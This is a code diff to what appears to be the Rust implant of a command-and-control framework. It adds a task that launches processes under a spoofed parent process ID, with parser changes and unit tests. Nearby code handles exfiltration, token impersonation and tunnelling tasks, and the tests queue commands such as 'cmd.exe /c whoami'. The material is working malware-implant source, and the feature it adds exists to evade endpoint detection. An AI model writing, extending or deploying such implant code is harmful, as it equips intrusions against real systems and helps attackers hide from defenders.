@@ -170,6 +170,9 @@ pub const COMMAND_SHELL_WRITE: u32 = 72;
 /// direct HTTP transport.
 pub const COMMAND_LINK: u32 = 73;
 pub const COMMAND_UNLINK: u32 = 74;
+/// `ps run` with a spoofed parent pid (free id after the pivot pair):
+/// same layout as COMMAND_PS_RUN plus `u32 LE ppid` before the args.
+pub const COMMAND_PS_RUN_PPID: u32 = 75;
 /// Tunnels (native beacon_agent numbering; UDP — 63/65 — is not
 /// implemented, like the original specter's tunnel.c which is
 /// TCP-only). Tasks arrive through TunnelCallbacks (PROXY_DATA), the
@@ -284,6 +287,8 @@ pub enum Task {
     PsRun {
         output: bool,
         prog_state: u32,
+        /// Spoofed parent pid (0 = inherit the beacon's parent).
+        ppid: u32,
         args_len: u16,
         args: [u8; PATH_CAP],
     },
@@ -515,17 +520,24 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let file_id = r.u32_le()?;
             Task::Exfil { action, file_id }
         }
-        COMMAND_PS_RUN => {
+        COMMAND_PS_RUN | COMMAND_PS_RUN_PPID => {
             // Native CmdPsUnpack order: byte progOutput, byte useToken,
             // int progState, array progArgs. The token flag is parsed and
             // ignored (no stored-token infrastructure yet - MVP).
+            // COMMAND_PS_RUN_PPID inserts the spoofed parent pid before args.
             let output = r.u8()? != 0;
             let _use_token = r.u8()?;
             let prog_state = r.u32_le()?;
+            let ppid = if command == COMMAND_PS_RUN_PPID {
+                r.u32_le()?
+            } else {
+                0
+            };
             let (args_len, args) = pack_string(r)?;
             Task::PsRun {
                 output,
                 prog_state,
+                ppid,
                 args_len,
                 args,
             }
@@ -1784,6 +1796,13 @@ mod tests {
         w.u32_le(0);
         ps(&mut w, b"cmd.exe /c whoami");
         w.u32_le(5);
+        w.u32_le(COMMAND_PS_RUN_PPID);
+        w.u8(1);
+        w.u8(0);
+        w.u32_le(0);
+        w.u32_le(1337);
+        ps(&mut w, b"cmd.exe /c whoami");
+        w.u32_le(15);
         w.u32_le(COMMAND_TOKEN_MAKE);
         w.u32_le(2);
         ps(&mut w, b"MEGACORP");
@@ -1855,6 +1874,39 @@ mod tests {
             parse_task(&mut Reader::new(&bytes)),
             Some((Task::Unlink, 3))
         );
+    }
+
+    #[test]
+    fn parse_task_ps_run_ppid() {
+        let mut buf = [0u8; 96];
+        let mut w = Writer::new(&mut buf);
+        w.u32_le(COMMAND_PS_RUN_PPID);
+        w.u8(1);
+        w.u8(0);
+        w.u32_le(0);
+        w.u32_le(1337);
+        let args: &[u8] = b"whoami";
+        w.u32_le((args.len() + 1) as u32);
+        w.push(args);
+        w.u8(0);
+        w.u32_le(7);
+        let bytes = w.written_bytes().to_vec();
+        let mut r = Reader::new(&bytes);
+        let (task, id) = parse_task(&mut r).expect("ps_run ppid parses");
+        match task {
+            Task::PsRun {
+                output,
+                ppid,
+                args_len,
+                ..
+            } => {
+                assert!(output);
+                assert_eq!(ppid, 1337);
+                assert_eq!(args_len, 6);
+            }
+            _ => panic!("expected PsRun"),
+        }
+        assert_eq!(id, 7);
     }
 
     /// Deterministic hostile-pack fuzz: mutate a valid pack (truncation,
